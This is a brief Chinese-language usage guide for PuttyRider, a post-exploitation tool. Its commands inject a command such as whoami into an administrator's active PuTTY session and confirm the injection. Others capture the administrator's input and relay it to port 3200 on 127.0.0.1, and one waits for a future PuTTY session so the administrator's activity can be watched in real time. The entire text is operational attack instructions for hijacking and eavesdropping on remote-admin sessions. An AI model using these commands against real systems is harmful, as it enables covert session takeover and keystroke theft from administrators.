1、向当前putty会话注入命令
puttyRider.exe -p 0 -f -c whoami
查看是否注入成功：
puttyRider.exe -l
2、查看管理员输入
puttyrider -p xxx|1136 -r 127.0.0.1:3200
3、监控进程-如果管理员当前没有使用Putty
可以使用-w参数：
puttyrider  -w -r 127.0.0.1:3200
命令执行后，当管理员再次使用putty时，可通过端口3200实时查看其操作。
